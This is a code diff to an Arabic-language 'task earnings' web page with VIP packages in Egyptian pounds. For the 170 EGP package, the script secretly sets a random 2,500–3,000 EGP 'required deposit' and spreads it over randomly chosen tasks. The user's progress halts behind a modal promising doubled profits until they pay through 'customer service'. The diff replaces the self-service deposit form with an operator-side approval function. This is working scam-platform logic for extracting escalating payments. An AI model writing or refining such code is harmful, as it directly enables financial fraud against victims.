@@ -410,14 +410,17 @@
         </div>
     </div>
 
-    <!-- DEPOSIT PROMPT MODAL (FOR SPECIAL TASKS) -->
+    <!-- DEPOSIT PROMPT MODAL (RESTRICTED - NO USER DEPOSIT BUTTON) -->
     <div id="deposit-modal" class="modal">
         <div class="modal-content" style="text-align: center;">
             <div style="font-size: 2.2rem; margin-bottom: 6px;">⚠️</div>
             <h3 style="margin-bottom:8px; color: #ffcc00; font-size:1rem;">مهمة خاصة (باقة مدمجة)</h3>
-            <p id="deposit-msg" style="font-size: 0.8rem; color: #ccc; margin-bottom: 12px; line-height: 1.5;"></p>
-            <div class="form-group" style="text-align: right;"><label>أدخل مبلغ الإيداع المطلوب لتأكيد المهمة</label><input type="number" id="special-deposit-val" placeholder="المبلغ المطلوب"></div>
-            <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem;" onclick="confirmSpecialDeposit()">إتمام الإيداع والمتابعة</button>
+            <p id="deposit-msg" style="font-size: 0.8rem; color: #ccc; margin-bottom: 15px; line-height: 1.5;"></p>
+            <div style="background: rgba(255,204,0,0.1); border: 1px dashed #ffcc00; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 0.78rem; color: #ffcc00;">
+                هذه المهمة تتطلب إيداعاً لتأكيدها. لا يمكنك إتمامها بنفسك، يرجى التواصل مع <b>خدمة العملاء (الإدارة)</b> لإتمام الإيداع وتأكيد المهمة من طرفهم لتستطيع المتابعة.
+            </div>
+            <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem; background:#333; color:#aaa; cursor:not-allowed;" disabled>بانتظار إيداع الإدارة...</button>
+            <button onclick="closeDepositModal()" style="width:100%; padding:6px; background:transparent; color:var(--text-sub); border:none; margin-top:8px; cursor:pointer; font-size:0.8rem;">حسناً</button>
         </div>
     </div>
 
@@ -470,7 +473,8 @@
         // متغيرات خاصة للباقة 170 لتوزيع طلبات الإيداع العشوائي
         let targetTotalDeposit = 0;
         let currentAccumulatedDeposit = 0;
-        let specialDepositTasks = {}; // لتخزين المهام التي تتطلب إيداعاً ومبلغها
+        let specialDepositTasks = {}; 
+        let pendingSpecialDepositAmount = 0;
 
         let currentUser = {
             phone: "",
@@ -649,15 +653,11 @@
             specialDepositTasks = {};
             currentAccumulatedDeposit = 0;
 
-            // إذا كانت الباقة 170 جنيه، نقوم بتوليد إجمالي إيداع عشوائي بين 2500 و 3000 جنيه
             if (limit === 170) {
                 targetTotalDeposit = Math.floor(Math.random() * (3000 - 2500 + 1)) + 2500;
                 
-                // نختار عشوائياً أرقام مهام (مثلاً بين 2 و 9) ليكون فيها إيداعات إضافية
-                // لنفترض أننا سنقوم بتوزيع المبلغ على مهام عشوائية (مثلاً 2 أو 3 مهام)
                 let remainingAmount = targetTotalDeposit;
-                let taskIndices = [2, 4, 6, 8]; // مهام محتملة للظهور العشوائي
-                // نختار عشوائياً مهام منها
+                let taskIndices = [2, 4, 6, 8]; 
                 let chosenTasks = taskIndices.sort(() => 0.5 - Math.random()).slice(0, 3);
                 chosenTasks.sort((a,b) => a - b);
 
@@ -726,11 +726,10 @@
 
             const nextTaskNum = activeCompletedTasks + 1;
 
-            // التحقق مما إذا كانت هذه المهمة تحتوي على إيداع عشوائي مطلوب (خاصة بباقة 170)
+            // إذا كانت المهمة تتطلب إيداعاً من الإدارة (المستخدم لا يمكنه الدفع بنفسه)
             if (activeVipLimit === 170 && specialDepositTasks[nextTaskNum]) {
-                const reqAmount = specialDepositTasks[nextTaskNum];
-                document.getElementById('deposit-msg').innerText = `ظهرت لك مهمة تسويقية خاصة رقم (${nextTaskNum}) تتطلب إيداعاً بقيمة EGP ${reqAmount} لإتمام الصفقة ومضاعفة الأرباح.`;
-                document.getElementById('special-deposit-val').value = reqAmount;
+                pendingSpecialDepositAmount = specialDepositTasks[nextTaskNum];
+                document.getElementById('deposit-msg').innerText = `ظهرت لك مهمة خاصة رقم (${nextTaskNum}) تتطلب إيداعاً بقيمة EGP ${pendingSpecialDepositAmount} من قِبل الإدارة لمتابعة الصفقة.`;
                 document.getElementById('deposit-modal').classList.add('active');
                 return;
             }
@@ -738,24 +737,19 @@
             proceedTaskExecution();
         }
 
-        function confirmSpecialDeposit() {
-            const inputVal = parseFloat(document.getElementById('special-deposit-val').value);
-            const nextTaskNum = activeCompletedTasks + 1;
-            const requiredAmt = specialDepositTasks[nextTaskNum];
-
-            if (isNaN(inputVal) || inputVal <= 0) {
-                alert("يرجى إدخال مبلغ صحيح");
-                return;
-            }
-
-            currentUser.balance += inputVal; // افتراض إضافة المبلغ المودع لرصيد الحساب لغرض المهمة
-            currentAccumulatedDeposit += inputVal;
-            
-            updateBalanceUI();
+        function closeDepositModal() {
             document.getElementById('deposit-modal').classList.remove('active');
-            
-            proceedTaskExecution();
         }
+
+        // دالة يمكن استدعاؤها من طرفك (الإدارة) لتأكيد إيداع المهمة الخاصة واستئناف العمل
+        window.adminApproveSpecialDeposit = function(amountAdded) {
+            currentAccumulatedDeposit += amountAdded;
+            currentUser.balance += amountAdded;
+            updateBalanceUI();
+            closeDepositModal();
+            alert("تم إيداع المبلغ بنجاح بواسطة الإدارة، يمكنك المتابعة الآن.");
+            proceedTaskExecution();
+        };
 
         function proceedTaskExecution() {
             const btn = document.getElementById('start-task-btn');
